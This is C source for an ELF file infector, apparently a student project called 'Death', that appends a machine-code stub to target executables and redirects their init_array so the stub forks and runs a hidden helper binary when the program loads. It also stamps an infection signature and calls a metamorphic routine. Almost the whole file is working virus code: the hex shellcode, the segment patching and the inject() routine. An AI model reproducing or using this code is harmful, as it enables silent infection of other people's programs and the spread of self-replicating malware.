#include "death.h"

unsigned char g_stub_code[] = 
{
	0xe8,0x3d,0x00,0x00,0x00,0x2f,0x74,0x6d,0x70,0x2f,0x77,0x61,0x72,
	0x5f,0x68,0x65,0x6c,0x70,0x65,0x72,0x2f,0x77,0x61,0x72,0x5f,0x68,
	0x65,0x6c,0x70,0x65,0x72,0x00,0x77,0x61,0x72,0x5f,0x68,0x65,0x6c,
	0x70,0x65,0x72,0x00,0x2f,0x70,0x72,0x6f,0x63,0x2f,0x73,0x65,0x6c,
	0x66,0x2f,0x65,0x78,0x65,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x5b,0xb8,0x3a,0x00,0x00,0x00,0x0f,0x05,0x48,0x83,0xf8,0x00,
	0x75,0x4a,0x48,0x8d,0x7b,0x26,0x48,0x81,0xec,0x00,0x01,0x00,0x00,
	0x48,0x89,0xe6,0xba,0xff,0x00,0x00,0x00,0xb8,0x59,0x00,0x00,0x00,
	0x0f,0x05,0x48,0x83,0xf8,0x00,0x78,0x1e,0xc6,0x04,0x06,0x00,0x48,
	0x8d,0x3b,0x48,0x31,0xc0,0x50,0x56,0x48,0x8d,0x4b,0x1b,0x51,0x48,
	0x89,0xe6,0x48,0x31,0xd2,0xb8,0x3b,0x00,0x00,0x00,0x0f,0x05,0xbf,
	0x01,0x00,0x00,0x00,0xb8,0x3c,0x00,0x00,0x00,0x0f,0x05,0x48,0x8b,
	0x43,0x35,0x48,0x85,0xc0,0x74,0x02,0xff,0xe0,0xc3
};

size_t g_stub_size = sizeof(g_stub_code);

int patch_init_array(int fd)
{
	Elf64_Ehdr eh;
	Elf64_Phdr ph;

	lseek(fd, 0, SEEK_SET);
	read(fd, &eh, sizeof(eh));
	Elf64_Off phoff = eh.e_phoff;
	Elf64_Half phnum = eh.e_phnum;
	Elf64_Phdr dyn_ph;
	int dyn_found = 0;
	for (int i = 0; i < phnum; i++) 
	{
		lseek(fd, phoff + i * sizeof(ph), SEEK_SET);
		read(fd, &ph, sizeof(ph));
		if (ph.p_type == PT_DYNAMIC) 
		{
			dyn_ph = ph;
			dyn_found = 1;
			break;
		}
	}
	if (!dyn_found)
		return 0;

	Elf64_Dyn dyn;
	uint64_t init_array_vaddr = 0;
	uint64_t init_array_sz    = 0;
	for (off_t off = dyn_ph.p_offset; off < (off_t)(dyn_ph.p_offset + dyn_ph.p_filesz); off += sizeof(dyn))
	{
		lseek(fd, off, SEEK_SET);
		read(fd, &dyn, sizeof(dyn));
		if (dyn.d_tag == DT_NULL)
			break;
		if (dyn.d_tag == DT_INIT_ARRAY)
			init_array_vaddr = dyn.d_un.d_ptr;
		else if (dyn.d_tag == DT_INIT_ARRAYSZ)
			init_array_sz = dyn.d_un.d_val;
	}
	if (!init_array_vaddr || init_array_sz < sizeof(uint64_t))
		return 0;
	Elf64_Phdr code_ph;
	int code_index = -1;
	for (int i = 0; i < phnum; i++) 
	{
		lseek(fd, phoff + i * sizeof(ph), SEEK_SET);
		read(fd, &ph, sizeof(ph));
		if (ph.p_type == PT_LOAD && (ph.p_flags & PF_X)) 
		{
			Elf64_Addr start = ph.p_vaddr;
			Elf64_Addr end   = ph.p_vaddr + ph.p_memsz;
			if (eh.e_entry >= start && eh.e_entry < end) 
			{
				code_ph = ph;
				code_index = i;
				break;
			}
		}
	}
	if (code_index < 0)
		return 0;
	const off_t align = 0x10;
	off_t end = code_ph.p_offset + code_ph.p_filesz;
	off_t stub_off = (end + (align - 1)) & ~(align - 1);
	lseek(fd, stub_off, SEEK_SET);
	write(fd, g_stub_code, g_stub_size);
	code_ph.p_filesz = (stub_off + g_stub_size) - code_ph.p_offset;
	code_ph.p_memsz  = code_ph.p_filesz;
	lseek(fd, phoff + code_index * sizeof(code_ph), SEEK_SET);
	write(fd, &code_ph, sizeof(code_ph));
	uint64_t stub_vaddr = code_ph.p_vaddr + (stub_off - code_ph.p_offset);
	off_t init_array_off = vaddr_to_file_offset(fd, init_array_vaddr);
	if (init_array_off < 0)
		return (0);
	lseek(fd, init_array_off, SEEK_SET);
	write(fd, &stub_vaddr, sizeof(stub_vaddr));
	return (1);
}


off_t vaddr_to_file_offset(int fd, uint64_t vaddr)
{
	Elf64_Ehdr eh;
	Elf64_Phdr ph;

	lseek(fd, 0, SEEK_SET);
	read(fd, &eh, sizeof(eh));
	for (int i = 0; i < eh.e_phnum; i++) 
	{
		lseek(fd, eh.e_phoff + i * sizeof(ph), SEEK_SET);
		read(fd, &ph, sizeof(ph));
		if (ph.p_type == PT_LOAD &&
			vaddr >= ph.p_vaddr &&
			vaddr <  ph.p_vaddr + ph.p_memsz)
		{
			return ph.p_offset + (off_t)(vaddr - ph.p_vaddr);
		}
	}
	return -1;
}

uint64_t file_offset_to_vaddr(int fd, off_t off)
{
	Elf64_Ehdr eh;
	Elf64_Phdr ph;

	lseek(fd, 0, SEEK_SET);
	read(fd, &eh, sizeof(eh));
	Elf64_Off uoff = (Elf64_Off)off;
	for (int i = 0; i < eh.e_phnum; i++) 
	{
		lseek(fd, eh.e_phoff + i * sizeof(ph), SEEK_SET);
		read(fd, &ph, sizeof(ph));
		if (ph.p_type == PT_LOAD &&
			uoff >= ph.p_offset &&
			uoff <  ph.p_offset + ph.p_filesz)
		{
			return ph.p_vaddr + (uoff - ph.p_offset);
		}
	}
	return 0;
}


off_t find_signature_offset(int fd)
{
	char buf[4096];
	const char *sig = SIGNATURE_BASIC;
	size_t sig_len = SIGNATURE_BASIC_LEN;

	lseek(fd, 0, SEEK_SET);
	off_t pos = 0;
	ssize_t r;
	while ((r = read(fd, buf, sizeof(buf))) > 0)
	{
		for (ssize_t i = 0; i <= r - (ssize_t)sig_len; i++)
		{
			if (memcmp(&buf[i], sig, sig_len) == 0)
				return pos + i + sig_len; 
		}
		pos += r;
	}
	return -1;
}



void inject(char *path)
{
	int fd = open(path, O_RDWR);
	if (fd < 0)
		return;
	off_t fp_offset = find_signature_offset(fd);
	if (fp_offset >= 0) 
	{
		patch_init_array(fd);
		close(fd);
		return;
	}
	char sig[256];
	snprintf(sig, sizeof(sig),
			 "D34TH version 1.0 (c)oded by marcheva-dedavid - [00000000]");
	lseek(fd, 0, SEEK_END);
	metamorphe(fd, "/home/marc/git_ub/42cursus/death/Death");
	lseek(fd, 0, SEEK_END);
	write(fd, sig, strlen(sig));
	patch_init_array(fd);
	close(fd);
}
